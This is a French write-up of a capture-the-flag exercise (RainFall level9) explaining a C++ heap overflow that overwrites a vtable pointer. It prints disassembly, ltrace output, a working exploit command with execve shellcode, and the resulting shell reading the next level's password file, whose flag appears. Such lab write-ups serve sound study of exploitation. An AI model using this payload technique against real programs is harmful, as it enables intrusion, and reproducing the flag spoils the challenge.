L'on remarque un double déréférencement du registre eax qui se trouve être un pointeur vers le deuxième objet créé.

```bash
 8048680:	8b 00                	mov    (%eax),%eax    -> (vtable)
 8048682:	8b 10                	mov    (%eax),%edx    -> (Fonction operateur+)
```

Nous remarquons également un memcpy qui prend en paramètre le premier argument et qui prend un strlen de notre entrée. Le memcpy pointe vers le premier objet.

```bash
0804870e <_ZN1N13setAnnotationEPc>:
 804870e:	55                   	push   %ebp
 804870f:	89 e5                	mov    %esp,%ebp
 8048711:	83 ec 18             	sub    $0x18,%esp
 8048714:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048717:	89 04 24             	mov    %eax,(%esp)
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    0x8(%ebp),%edx
 8048722:	83 c2 04             	add    $0x4,%edx
 8048725:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048729:	8b 45 0c             	mov    0xc(%ebp),%eax
 804872c:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048730:	89 14 24             	mov    %edx,(%esp)
 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
```

Nous observons le ltrace du level9 afin de trouver l'endroit où sont stockés nos objets.
Puis on overflow le memcpy afin d'écrire sur la vtable du deuxième objet l'adresse d'une adresse mis aux préalable dans le premier objet qui lui même redirige vers le shellcode inséré dans le deuxième objet. #Leo adore l'artificiel !

```bash
level9@RainFall:~$ ltrace ./level9 aa
__libc_start_main(0x80485f4, 2, 0xbffff7e4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)          = 0
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                     = 0x804a008 <-
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                              = 0x804a078 <-
strlen("aa")                                                                   = 2
memcpy(0x0804a00c, "aa", 2)                                                    = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)        = 0xb7fce4a0
+++ exited (status 11) +++
```

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "Z" * 104 + "\x7c\xa0\x04\x08" + "\x74\xa0\x04\x08" + "\x31\xC0\x31\xDB\x31\xD2\x31\xC9\xB0\x0B\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\xCD\x80"')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
